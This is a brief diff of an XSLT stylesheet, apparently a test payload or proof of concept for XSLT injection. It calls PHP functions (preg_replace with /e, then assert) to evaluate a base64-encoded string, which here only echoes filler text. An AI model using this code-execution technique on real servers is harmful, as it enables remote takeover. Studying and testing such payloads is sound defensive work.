@@ -6,7 +6,7 @@
         <xsl:variable name="eval">
           eval(base64_decode("ZWNobyAiQUFBQUFBQUFBQUFBQUFBQUFBQUEiOwo="))
         </xsl:variable>
-        <xsl:value-of select="php:function('preg_replace', '/.*/e', $eval, '')" />
+        <xsl:value-of select="php:function('assert', $eval)" />
       </body>
     </html>
   </xsl:template>
